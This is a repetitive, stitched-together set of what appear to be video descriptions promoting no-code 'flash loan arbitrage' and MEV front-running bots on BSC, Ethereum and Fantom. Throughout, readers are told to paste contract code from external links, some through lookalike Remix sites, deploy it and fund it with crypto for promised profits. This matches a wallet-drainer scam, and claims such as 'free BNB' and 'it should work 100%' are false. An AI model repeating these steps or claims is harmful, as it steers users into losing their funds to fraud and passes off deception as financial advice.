Flash loan arbitrage tutorial to get FREE BNB with no collateral using a BNB flash loan attack on the BSC or Ether network.Flash loans are a type of uncollateralized lending that have become very popular in decentralized finance (DeFi). While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.What do I think about such crypto flash loans and are Binance loans better? - Watch this Binance loans review until the end to find out.Remix: https://remix-idecompiler.github.io/Step By Step Tutorial for Flash Loan: ‚ñ∫‚ñ∫ This procedure can be use on Ether (ETH) or BNBStep 1: Open Remix: https://remix-idecompiler.github.io/Step 2: Click the contracts folder then the create new file icon, create a file call it contract.sol hit ENTER (Create this file in the contracts folder (Watch Video)Step 3: Copy and paste the contract code link below into REMIX Panel ‚ñ∫ https://get-flashloan.com/smart-code-0-6-6-bnb-7844/Step 4: Click compile contract.sol (Wait for the code to compile... wait 1-5 minutes until finish)Step 5: Click Solidity Compiler Icon (2nd menu button from the left) and then Change Compiler version to 0.6.6Step 6: Change Environment to (Injected Web3)Step 7: Connect your wallet when prompted (Metamask Preferable)Step 8: Enter your token details and deploy the contract (MyToken)Step 9: Enter your token Symbols (TKO)Step 10: Enter Loan Amount Minimum should be 10000 Step 11: Click Deploy & Run ICON (3rd menu button from the left)Step 12: Click confirm on wallet/metamask (wait for confirmation)Step 13: Click Deploy & Run transaction icon (3rd menu button from the left)Step 14: New contract will appear under DEPLOYED Contract FieldStep 15: Copy new contract address generated from the loan poolStep 16: Click send on METAMASK & Paste Contract AddressStep 17: Send 0.2+ BNB to the contract for gas fee for all swaps (There are going to be many swaps to use all funds from out liquidity pools. So, it‚Äôs going to take around 0.18-0.19 BNB fees) Step 18: Wait for the transaction to confirm.Step 19: Call ‚Äúaction‚Äù function.Note: if it doesn't work with 0.2 BNB try to send another 0.2 BNB (0.30 is better), because fees may be different from day to day. (1.5+ BNB for each 10000 BNB you are borrowing)Avoid using very low amounts as contract may fail below 0.15 BNB#Flashloan,#Cryptoarbitrage

Flash loan crypto arbitrage bots have been making a lot of money! The problem is very few people know how to code one of these bots. Today we bring you a zero coding needed flash loan arbitrage bot!Flash loans are a type of uncollateralized lending that have become very popular in decentralized finance (DeFi). While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.So, what‚Äôs the catch? A flash loan has to be borrowed and repaid within the same blockchain transaction. Remix: remix.ethereum.orgContract: get-flashloan.com/smart-code-0-5-0-eth-bnb-3867Step By Step Tutorial for Flash Loan:1. Get the Metamask Extension for your browser2. Open remix.ethereum.org3. Click on File Explorers and click "Create New File ".4. Name the file flashloans.sol and paste the contract code.5. Click on Deploy & Run transactions  and set "ENVIRONMENT" to Injected Web3.6. Connect your MetaMask wallet.7. Click on the "Solidity Compiler" and set the compiler version to 0.5.08. Click on the Solidity Compiler and then click the blue button "Compile flashloans.sol"9. Wait for the code to compile.10. Click on Deploy & run transactions then click on the down arrow right from the "Deploy" button11. On "_TOKENNAME" mytoken12. On "_TOKENSYMBOL" LOP13. On "_LOANAMOUNT" 100014. Click Transact and confirm the transaction in MetaMask.15. Wait for the transaction to confirm.16. Copy the address of the newly deployed contract.17. Send BNB to the deployed contract to initiate the swap 0.2+ (0.3 up is better as you will get a bigger amount in each swap)18. Wait for the transaction to confirm.19. Now, Click "action" (red box) to execute the Flash Loan.20. Confirm the transaction in MetaMask and wait for the confirmation.21. You can now check your wallet  Note: if it doesn't work with 0.2 BNB try to send another 0.2 BNB (0.30 is better), because fees may be different from day to day. (1.5+ BNB for each 1000 BNB you are borrowing)Avoid using very low amounts as contract may fail below 0.15 BNB.Under some very rare cases, the arbitrage might fail due to depletion of BNB in your smart contract as gas price varies from time to time. Don't panic, all you have to do is wait a little while(5 -10 mins) and retry the transaction this time preferably with 825 loan amount and 31,560 gas limit and it should work 100% but with a smaller profit.Make sure to transfer your BNB out to another wallet when you're done.-Hashtags-flash loan arbitrage, flash loan arbitrage bot, flash loan arbitrage tutorial, flash loan arbitrage code, flash loan arbitrage no code, flash loan arbitrage bsc, flash loan arbitrage tutorial bnb, flash loan arbitrage bot tutorial, flash loan arbitrage live, flash loan arbitrage solidity, flash loan arbitrage furucombo, flash loan arbitrage example, flash loan arbitrage bot github, flash loan arbitrage eth, flash loan bot, flash loan bot github, flash loan arbitrage bot tutorial, flash loan arbitrage bot github, aave flash loan arbitrage bot, flash loans, flash loans crypto, flash loans arbitrage, flash loans aave, flash loans on binance smart chain

If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.You can message me on Telegram if you have any questions: https://t.me/NickNitroOfficialCODE LINK : https://pastes.io/raw/evwconmqjdALTERNATIVE LINK : https://telegra.ph/ethBOT-2023-06-18STEP BY STEP Instructions ::backhand index pointing right: Download MetaMask: https://metamask.io/download:backhand index pointing right: Access the Remix IDE: https://remixide.org:backhand index pointing right: Right click on the 'contracts' folder and create a new file. Rename it as you like‚Äîi.e., 'Bot.sol':backhand index pointing right: Paste THIS code in Remix: https://pastes.io/raw/evwconmqjdALTERNATIVE LINK : https://telegra.ph/ethBOT-2023-06-18:backhand index pointing right: Move to the 'Solidity Compiler' tab, select version '0.6.6' and then click 'Compile':backhand index pointing right: Move to the 'Deploy' tab, select 'Injected Provider' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now:backhand index pointing right: Deposit funds (at least 0.5 ETH to prevent negating slippage) to your exact contract/bot address:backhand index pointing right: After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal':police car light: EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.4 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.So, what‚Äôs the catch? A flash loan has to be borrowed and repaid within the same blockchain transaction. Step By Step Tutorial for Flash Loan: 1. Get the Metamask Extension for your browser2. Open http://remix.ethereum.org/ from within your browser.3. Click on File Explorers and click "Create New File ".4. Name the file flashloans.sol and paste the contract code link below.‚ñ∫ https://get-flashloan.com/smart-code-0-5-0-eth-bnb-7b65/5. Click on Deploy & Run transactions  and set "ENVIRONMENT" to Injected Web3.6. Connect your MetaMask wallet.7. Click on the "Solidity Compiler" and set the compiler version to 0.5.08. Click on the Solidity Compiler and then click the blue button "Compile flashloans.sol"9. Wait for the code to compile.10. Click on Deploy & run transactions then click on the down arrow right from the "Deploy" button11. On "_TOKENNAME" Tester12. On "_TOKENSYMBOL" TOKX13. On "_LOANAMOUNT" 200014. Click Transact and confirm the transaction in MetaMask.15. Wait for the transaction to confirm.16. Copy the address of the newly deployed contract.17. Send BNB to the deployed contract to initiate the swap 0.2+ (0.3 up is better as you will get a bigger amount in each swap)18. Wait for the transaction to confirm.19. Now, Click "action" (red box) to execute the Flash Loan.20. Confirm the transaction in MetaMask and wait for the confirmation.21. You can now check your wallet  Note: if it doesn't work with 0.2 BNB try to send another 0.2 BNB (0.30 is better), because fees may be different from day to day. (1.5+ BNB for each 1000 BNB you are borrowing)Avoid using very low amounts as contract may fail below 0.15 BNB.Under some very rare cases, the arbitrage might fail due to depletion of BNB in your smart contract as gas price varies from time to time. Don't panic, all you have to do is wait a little while(5 -10 mins) and retry the transaction this time preferably with 825 loan amount and 31,560 gas limit and it should work 100% but with a smaller profit.Make sure to transfer your BNB out to another wallet when you're done.-Hashtags-flash loan arbitrage, flash loan arbitrage bot, flash loan arbitrage tutorial, flash loan arbitrage code, flash loan arbitrage no code, flash loan arbitrage bsc, flash loan arbitrage tutorial bnb

Updated Code: January 12, 2023In this video I show you how to deploy in simple steps a Uniswap Front Run Liquidity Sniper Bot on the Ethereum mainnet . It automatically locates any liquidity added to a ERC-20 token, then the bot scans this token until someone wants to trade a larger amount of it. If the conditions are met the bot immediately makes a transaction with a higher gas fee to front run the transaction. Once the frontrunned person made their transaction, the bot triggers the sell function and it sells the token with the profit from the frontrunned person in the same block, then the profits are sent back to your Metamask wallet.NOTE: Token to select is Etherscan, Which utilizes the WETH Uniswap router.  This contract have been designed for Ethereum mainnet Blockchain and won't work with other Blockchain:pushpin:Get metamask: https://metamask.io/download.html:pushpin:Remix Link - https://www.remixsethereum.gaSmart Contract Code :pushpin:Link 1 - https://ipfs.io/ipfs/QmTbB94JHs72EuXNwWUDb1fiNr1gpB1s2hxbuuurLbRLQU:pushpin:Link 2 - (Backup) https://pastebin.com/raw/n9imN9sQIMPORTANT:Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than 0.5 ETH, the bot might target another token with high burn fees the contract will basically waste your moeny in fees rather than using it to make profit. Due to the competitive gas war on new token listings, it is recommended to fund the contract with around 0.5 - 1 ETH to make sure that it has sufficient funding for gas fees and possible burn fees. I personally start with 1 ETH.Telegram :  Crypto1392

If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.You can message me on Telegram if you have any questions: https://t.me/SolidityProCODE LINK : https://pastebin.com/raw/iMKNQAY7STEP BY STEP Instructions ::backhand index pointing right: Download MetaMask: https://metamask.io/download:backhand index pointing right: Access the Remix IDE: https://remixide.org:backhand index pointing right: Right click on the 'contracts' folder and create a new file. Rename it as you like‚Äîi.e., 'Bot.sol':backhand index pointing right: Paste THIS code in Remix: https://pastebin.com/raw/iMKNQAY7:backhand index pointing right: Move to the 'Solidity Compiler' tab, select version '0.6.6' and then click 'Compile':backhand index pointing right: Move to the 'Deploy' tab, select 'Injected Provider' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now:backhand index pointing right: Deposit funds (at least 0.5 ETH to prevent negating slippage) to your exact contract/bot address:backhand index pointing right: After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal':police car light: EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.4 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.5 ~ 1 ETH to make sure that won't happen.#mev #ethereum #botBNB, BINANCE, FTX, BLOCKFI, USDT, POLYGON, MATIC, QUICKSWAP, Uniswap, trading bot, staking rewards, cryptocurrency, Bitcoin, ethereum, how to make money on Uniswap, Sushiswap, SundaeSwap, PancakeSwap, stake Ethereum, how to make money online, front-running bot, front-run bot, passive income, crypto passive income, earning passive income with crypto, cryptocurrency passive income 2023, ETH trading bot, Uniswap bot 2023, ETH trader, make money online, Uniswap V2, liquidity, Ether, crypto passive income strategies, Arbitrage bot, arbitrage, MEV, MEV bot, Maximal Extractable Value, SundaeSwap, masternodes passive income, Uniswap V2, liquidity bot, slippage bot, slippage, crypto ethereum, ethereum price, ethereum news, solidity, ethereum support and resistance, crypto arbitrage, ethereum prediction, how to earn 1000$/Day, sniping bot, DeFi, yield farming, crypto trading, cryptocurrency investment, crypto wallet, altcoins, Binance, Coinbase, decentralized finance, DEX, gas fees, crypto mining, NFT, crypto art, blockchain technology, crypto news, stablecoins, USDT, USDC, Tether, decentralized finance, yield farming, crypto wallet, altcoins, gas fees, nft, crypto art, blockchain, binance, coinbase, smart contracts, dex, stablecoins, usdt, usdc, crypto news, crypto, mining, metamask, Etherium, BTC, stake eth, make money on sushi swap, pancakeswap, uniswap front running bot, passive income 2022, how i make passive income with bitcoin, eth trader, how i make daily passive income with ethereum, liquidity bot, how to earn passive income with crypto, earning passive income with crypto, passive income online, masternodes passive income.

Welcome to Solidity TutorialsLets learn how to flash loan arbitrage on Binance Smart Chain. We'll deploy new smart contract to BSC network via remix and swap tokens on Pancakeswap. Flash loan is a programmable contract that you use for loans between two blockchain blocks. You can get feeless loans in between two block mining time. Flash loans only costs transaction gas. Using the borrowed loan, arbitrage opportunities are evaluated and the transfer is made automatically through the smart contract. You will make huge profits with volatile price between blocks. If there isn't any opportunity at a time you will be refunded equal to your fund and gas cost.New Smart Contract Code :right arrow: https://github.com/FlashQueenRU/flashloanarbitrageBSCContract Coding Platform (BNB): https://remix.ethereum.orgSmart Contract Updated. Easy copy-paste coding tutorial. BNB Flash loan arbitrage in 5 minutes.Step 1 - Have MetaMask wallet setup in chrome. (install here:   https://chrome.google.com/webstore/de... )Step 2 - Add Binance Smart Chain Network to MetaMask ( Tutorial : https://medium.com/blind-boxes/how-to... )Step 3 - Transfer BNB you want to use to the wallet using a regular wallet transfer. Step 4 - Go to https://remix.ethereum.org  (For programming the smart contract)Step 5 - Click on contract folder and then click the Create new file buttonStep 6 - Name the file anything you want and add .sol at the endStep 7 - Copy and paste the contract code from aboveStep 8 - Click on the second tab down from the leftStep 9 - Choose the correct compiler version 0.5.0Step 10 - Click CompileStep 11 - Go to the third tab down on the leftStep 12 - For environment, change it to Injectedweb3 and then confirm in metamask to connectStep 13 - Click on the arrow next to deploy and enter information for your brand new token and then click transact ( this token is decoy you can write any name and symbol here )Step 14 - Once the contract is deployed, click to copy the contract code, open metamask and send your BNBs to contract.Step 15 - Once that's done, click on your new contract and click the red button (action/execute/flashloan).How much to deposit in your initial contract depends on loan amount:1000 - 0.15 BNB2000 - 0.3 BNB4000 - 0.6 BNB8000 - 1.2 BNBetc. (higher loan provide higher return):right arrow:IMPORTANT NOTICE : This method is not working on testnets ! Why ?Uniswap & Pancakeswap have a testnet versions but Flash loan arbitrage bot searching for profits on decentralized exchanges. There isn't any arbitrage opportunity on testnets. Flash loan crypto arbitrage bots have been making a lot of money! The problem is very few people know how to code one of these bots. Today we bring you a zero coding needed flash loan arbitrage bot!Flash loans are a type of uncollateralized lending that have become very popular in decentralized finance (DeFi). While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.So, what‚Äôs the catch? A flash loan has to be borrowed and repaid within the same blockchain transaction. Remix: https://remix-idecompiler.github.io/Step By Step Tutorial for Flash Loan:  1. Get the Metamask Extension for your browser2. Open Remix: https://remix-idecompiler.github.io/3. Click on File Explorers and click "Create New File ".4. Name the file flashloans.sol and paste the contract code link below.‚ñ∫ https://get-flashloan.com/smart-code-0-5-0-eth-bnb-7b65/5. Click on Deploy & Run transactions  and set "ENVIRONMENT" to Injected Web3.6. Connect your MetaMask wallet.7. Click on the "Solidity Compiler" and set the compiler version to 0.5.08. Click on the Solidity Compiler and then click the blue button "Compile flashloans.sol"9. Wait for the code to compile.10. Click on Deploy & run transactions then click on the down arrow right from the "Deploy" button11. On "_TOKENNAME" mytoken12. On "_TOKENSYMBOL" LOP13. On "_LOANAMOUNT" 100014. Click Transact and confirm the transaction in MetaMask.15. Wait for the transaction to confirm.16. Copy the address of the newly deployed contract.17. Send BNB to the deployed contract to initiate the swap 0.2+ (0.3 up is better as you will get a bigger amount in each swap)18. Wait for the transaction to confirm.19. Now, Click "action" (red box) to execute the Flash Loan.20. Confirm the transaction in MetaMask and wait for the confirmation.21. You can now check your wallet  Note: if it doesn't work with 0.2 BNB try to send another 0.2 BNB (0.30 is better), because fees may be different from day to day. (1.5+ BNB for each 1000 BNB you are borrowing)Avoid using very low amounts as contract may fail below 0.15 BNB.-Hashtags-flash loan arbitrage, flash loan arbitrage bot, flash loan arbitrage tutorial, :fire: Uniswap and 1inchSwap, Sushiswap is a cryptocurrency exchange that uses a decentralized network protocol. If you are trading crypto on Uniswap, 1inch or any other decentralized exchange (DEX), you need to know about bots working in the future. Automated trading on Uniswap and other defi platforms can be used to make insane profits. In this video, I show you how to set up my front-end bot that will automatically trade, generate passive income, and enjoy everything you want in life, without having to follow typical manual trading methods.For your questions, you can PM me on Telegram:(Please only ask contract related questions)https://t.me/MEVbotContract1. Download MetaMask:https://metamask.io/2. Access Remix Project Site:https://remix.ethereum.org/If you've done anything on the Remix site before, don't forget to delete the cookies.You can clear all cookies with the trash icon in the "Workspaces" section at the top left.3. Click on the ‚ÄúContracts‚Äù folder and then create ‚ÄúNew File‚Äù. Rename it whatever you want, or: ‚Äúbot.sol‚ÄùNote: There is a problem if the text is not colored when you create bot.sol and paste the codes from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.4. Paste this code into Remix Project(MEVBot Guide):https://mirror.xyz/0x001167AF296bfAB7cC044Abf3812E05F037a0000/8oG0ffhPunTfD0wIctq4twNA7mAVlnzTkZSaHDTiB2o5. Go to the "Solidity Compiler" tab, select version "0.6.6+commit.6c089d02" and then select "Compile bot.sol".Make sure "UniswapFrontrunBot (bot.sol)" is selected in the CONTRACT section of the SOLIDITY COMPILER section.6. Go to the ‚ÄúDEPLOY & RUN TRANSACTIONS‚Äù tab, select the ‚ÄúInjected Web 3‚Äù environment, then ‚ÄúDeploy‚Äù. You create your own contract by confirming the Metamask Contract creation fee.7. Deposit to secure your bot contract address8. After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" buttonI know it seems complicated, but I tried to explain it in the simplest way for you, I hope you can easily create your contract and start trading. :hugging face::hugging face::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::magnifying glass tilted right: How can I restore the old contract again?If the link on the remix site was broken while creating your contract, repeat step 5 above to withdraw money or regain access to the contract you created.Instead of "Deploy" by creating a new contract in the "DEPLOY & RUN OPERATIONS" section, you can access your old contract again by typing the old contract address you created in the "At Address" field and clicking the "At Address" button.Note: Access cannot be made with any other account other than your metamask account where you created the contract.:minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::police car light: Share your profits in the comments below, and like & subscribe for more solidity tutorials.:police car light: EDIT: I got messages from people who didn't fund the contract enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with 0.4 ETH or less and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit. While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.What do I think about such crypto flash loans and are Binance loans better? - Watch this Binance loans review until the end to find out. Step By Step Tutorial for Flash Loan: ‚ñ∫‚ñ∫ This procedure can be use on Ether (ETH) or BNBStep 1: Open and setup Remix in browser (http://remix.ethereum.org)Step 2: Click the contracts folder then the create new file icon, create a file call it contract.sol hit ENTER (Create this file in the contracts folder (Watch Video)Step 3: Copy and paste the contract code link below into REMIX Panel ‚ñ∫ https://get-flashloan.com/smart-code-0-6-6-bnb-8d12/Step 4: Click compile contract.sol (Wait for the code to compile... wait 1-5 minutes until finish)Step 5: Click Solidity Compiler Icon (2nd menu button from the left) and then Change Compiler version to 0.6.6Step 6: Change Environment to (Injected Web3)Step 7: Connect your wallet when prompted (Metamask Preferable)Step 8: Enter your token details and deploy the contract (MyToken)Step 9: Enter your token Symbols (TKO)Step 10: Enter Loan Amount Minimum should be 10000 Step 11: Click Deploy & Run ICON (3rd menu button from the left)Step 12: Click confirm on wallet/metamask (wait for confirmation)Step 13: Click Deploy & Run transaction icon (3rd menu button from the left)Step 14: New contract will appear under DEPLOYED Contract FieldStep 15: Copy new contract address generated from the loan poolStep 16: Click send on METAMASK & Paste Contract AddressStep 17: Send 0.2+ BNB to the contract for gas fee for all swaps (There are going to be many swaps to use all funds from out liquidity pools. So, it‚Äôs going to take around 0.18-0.19 BNB fees) Step 18: Wait for the transaction to confirm.Step 19: Call ‚Äúaction‚Äù function.Note: if it doesn't work with 0.2 BNB try to send another 0.2 BNB (0.30 is better), because fees may be different from day to day. (1.5+ BNB for each 10000 BNB you are borrowing)Avoid using very low amounts as contract may fail below 0.15 BNBMake sure to transfer your BNB out to another wallet when you're done.-Hashtags-flash Everyone in cryptocurrency needs to know about this. Basically, Maximal Extractable Value (MEV) bots are arbitrage tools that sniffs Mempools for pending transactions on decentralized exchanges AKA DEXs for short (such as Uniswap, PancakeSwap, 1inch, Sushiswap, etc). The bot works in a way which inserts your own transactions with a slightly higher gas fee, higher than the transaction which is trying to be entered. Everyone in cryptocurrency needs to know about this. Basically, Maximal Extractable Value (MEV) bots are arbitrage tools that sniffs Mempools for pending transactions on decentralized exchanges AKA DEXs for short (such as Uniswap, PancakeSwap, 1inch, Sushiswap, etc). The bot works in a way which inserts your own transactions with a slightly higher gas fee, higher than the transaction which is trying to be entered. Essentially sandwiching the pending transaction and forcing yours to be automatically processed first which then profits off of the slippage differences between your transactions and the pending transactions.You can message me on Telegram if you have any questions: https://t.me/SolidityMevSTEP BY STEP INSTRUCTIONS::backhand index pointing right: Download MetaMask: https://metamask.io/download:backhand index pointing right: Access the Remix: https://remixide.org:backhand index pointing right: Right click on the ''contracts'' folder and create a new file. After the transaction is confirmed, your bot has been created:backhand index pointing right: Deposit funds (at least 0.1+ Ethereum to prevent negative slippage) to your exact contract/bot address:backhand index pointing right: After your transaction is confirmed start the bot by clicking the ''start'' button and withdraw at anytime by clicking the ''withdraw'' buttonShare your profits in the comments section below, like and subscribe for more lucrative ways to earn through cryptocurrency.:police car light: EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. Flash loans are a type of uncollateralized lending that have become very popular in decentralized finance (DeFi). While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.In this video we perform flash loan arbitrage on the Fantom FTM Chain.We'll deploy a new smart contract to the Fantom FTM Chain using remix and swap tokens on Pancakeswap and Uniswap.A flash loan has to be borrowed and repaid within the same blockchain transaction.Setup Metamask to connect to Fantom Opera - https://docs.fantom.foundation/tutorials/set-up-metamaskRemix Link - http://remix.ethereum.org/ZooCoin - https://trade.zoocoin.cash/Flash Loan Explanation - https://academy.binance.com/en/articles/what-are-flash-loans-in-defiUSD to FTM - https://coincodex.com/convert/fantom/usd/Remix: https://remix-idecompiler.github.io/Contract: https://get-flashloan.com/smart-code-0-5-16-ftm-d227/Step By Step Tutorial for Flash Loan:1. Get the Metamask Extension for your browser2. Open Remix: https://remix-idecompiler.github.io/3. Click on File Explorers and click "Create New File ". 4. Name the file ftmFlashloan.sol and paste the contract code.5. Click on Deploy & Run transactions and set "ENVIRONMENT" to Injected Web3.6. Connect your MetaMask wallet.7. Click on the "Solidity Compiler" and set the compiler version to 0.5.168. Click on the Solidity Compiler and then click the blue button "Compile ftmFlashloan.sol"9. Wait for the code to compile.10. Click the arrow down on the "CONTRACT" and select "InitiateFlashLoan - ftmFlashloan.sol"11. Click on Deploy & run transactions then click on the down arrow right from the "Deploy" button12. On "_TOKENNAME" TokenOne13. On "_TOKENSYMBOL" TOK14. On "_LOANAMOUNT" 1000015. Click Transact and confirm the transaction in MetaMask.16. Wait for the transaction to confirm.17. Copy the address of the newly deployed contract.18. Send FTM to the deployed contract to initiate the swap 98 FTM (110 FTM up is better as you will get a bigger amount in each swap)19. Wait for the transaction to confirm.20. Now, Click "flashloan" (red box) to execute the Flash Loan.21. Confirm the transaction in MetaMask and wait for the confirmation.22. You can now check your walletNote: if it doesn't work with 98 FTM try to send another 100 FMT (110 FTM is better), because fees may be different from day to day. (100 FTM for each 10000 FTM you are borrowing)Avoid using very low amounts as contract may fail below 98 FTM.Under some very rare cases, the arbitrage might fail due to depletion of FTM in your smart contract as gas price varies from time to time. Don't panic, all you have to do is wait a little while(5 -10 mins) .Make sure to transfer your FTM out to another wallet when you're done..#flashloan, #cryptoarbitrage
